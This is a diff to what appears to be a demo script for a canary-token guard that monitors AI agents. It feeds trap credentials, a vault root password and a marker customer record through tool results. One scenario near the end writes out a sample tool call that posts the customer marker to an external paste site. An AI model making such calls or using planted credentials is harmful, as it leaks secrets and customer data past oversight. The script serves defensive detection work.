@@ -71,23 +71,27 @@ def main() -> None:
         )
         show(who, what, r)
 
-    print("-- 1. an agent finds a forgotten credentials file in the repository (trap)")
-    grant("alice", "alice-coder", "github-acme")
-    company("coder", "github-acme", "/repos/acme/web/contents/.env.backup")
+    print("-- 1. an agent reads a forgotten credentials file in a repository (trap)")
+    guard(
+        "coder",
+        "tool_result",
+        f"AWS_ACCESS_KEY_ID={val['deploy-key']}",
+        "tool result of read_file .env.backup",
+        tool="read_file",
+    )
 
-    print("\n-- 2. an agent reaches for the break-glass vault credential (trap resource)")
-    grant("alice", "alice-coder", "vault-root-admin")
-    company("coder", "vault-root-admin", "/")
+    print("\n-- 2. an agent is handed the break-glass vault credential (trap)")
+    guard("coder", "tool_result", f"root password: {val['vault-root']}", "tool result from the vault", tool="read_file")
 
     print("\n-- 3. an agent reads the customer list: normal work, the ghost customer rides along (marker)")
-    grant("bob", "bob-assistant", "salesforce-crm")
-    company("assistant", "salesforce-crm", "/accounts")
+    accounts = json.dumps([{"id": 42, "name": "Acme Sp. z o.o."}, {"id": 9001, "name": val["ghost-customer"]}])
+    guard("assistant", "tool_result", accounts, "tool result with the customer list", tool="search_crm")
 
     print("\n-- 4. the customer list leaves through a tool call: the ghost customer trips")
     guard(
         "ops",
         "tool_call",
-        json.dumps({"url": "https://paste.example/new", "body": f"Jan Kowalski; {val['ghost-customer']}"}),
+        json.dumps({"url": "https://paste.example/new", "body": val["ghost-customer"]}),
         "posts the list to an external site",
         tool="http_get",
     )
